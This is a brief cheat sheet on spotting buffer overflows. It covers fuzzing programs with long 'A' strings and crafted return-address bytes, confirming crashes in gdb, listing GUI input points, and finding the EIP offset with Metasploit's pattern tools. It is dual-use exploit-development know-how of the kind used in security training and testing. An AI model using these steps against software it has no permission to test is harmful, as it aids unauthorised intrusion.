
#### Is there a Buffer Overflow

First we need an input to test for overflow. It can be any other kind of input (user input, command line arguments, network commands, environment variables...). 

We can perform basic tests where we try different input, increasing the size to see if the program crashes:
`python -c "print('A' * 64)" | ./<program>`
`python -c "print('A' * 100)" | ./<program>`
`python -c "print('A' * 64 + '\x64\x63\x62\x61')" | ./<program>`
`echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0" | ./<program>`
`perl -e 'print "A"x64 . "\x24\x84\x04\x08"' | ./<program>`

``./<program> `python -c "print('A' * 64 + '\x64\x63\x62\x61')"` ``
`./<program> $(python -c "print('A' * 64 + '\x64\x63\x62\x61')")`
`./<program> 'echo -ne "12345678901234\x67\x05\x40\x0\x0\x0\x0\x0"'`

Look for open ports when the program is running and try sending data.
`netstat -a`

Confirm buffer overflow:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1200"))
Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```


##### GUI programs

**Field**            **Example**
`Text Input Fields`  - Program's "license registration" field.
				- Various text fields found in the program's preferences.
`Opened Files`       Any file that the program can open.
`Program Arguments`  Various arguments accepted by the program during runtime.              
`Remote Resources`   Any files or resources loaded by the program on run time or on a certain condition
...

##### Test input file creation

Create a file with 10000 As:
`python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"`

Create a non random file for finding the pos to overwrite:
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
`python -c "print('the random string', file=open('fuzz.wav', 'w'))"`

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31684630` where 0x31684630 is the contents of eip at the buffer overflow crash

